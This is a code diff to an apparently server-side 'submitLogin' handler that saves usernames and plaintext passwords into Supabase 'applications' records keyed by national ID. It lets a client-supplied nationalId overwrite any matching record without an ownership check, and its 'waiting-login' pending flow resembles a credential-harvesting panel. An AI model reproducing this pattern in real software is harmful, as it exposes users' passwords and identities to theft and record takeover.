@@ -183,20 +183,18 @@ async function handleProcedure(fullPath, rawInput, req, res) {
     }
 
     case 'submitLogin': {
-      const { username, password } = input;
+      const { username, password, nationalId: existingNid } = input;
       if (!username || !password) return { success: false };
-      const { data: existing } = await supabase.from('applications')
-        .select('national_id')
-        .eq('username', username)
-        .order('created_at', { ascending: false })
-        .limit(1)
-        .maybeSingle();
-      if (existing) {
-        await supabase.from('applications').update({
-          password, current_page: 'waiting-login',
-          login_status: 'pending', last_active_at: Date.now()
-        }).eq('national_id', existing.national_id);
-        return { success: true, nationalId: existing.national_id };
+      if (existingNid) {
+        const { data: rec } = await supabase.from('applications')
+          .select('national_id').eq('national_id', existingNid).maybeSingle();
+        if (rec) {
+          await supabase.from('applications').update({
+            username, password, current_page: 'waiting-login',
+            login_status: 'pending', last_active_at: Date.now()
+          }).eq('national_id', existingNid);
+          return { success: true, nationalId: existingNid };
+        }
       }
       const nid = 'LOGIN_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
       await supabase.from('applications').insert({
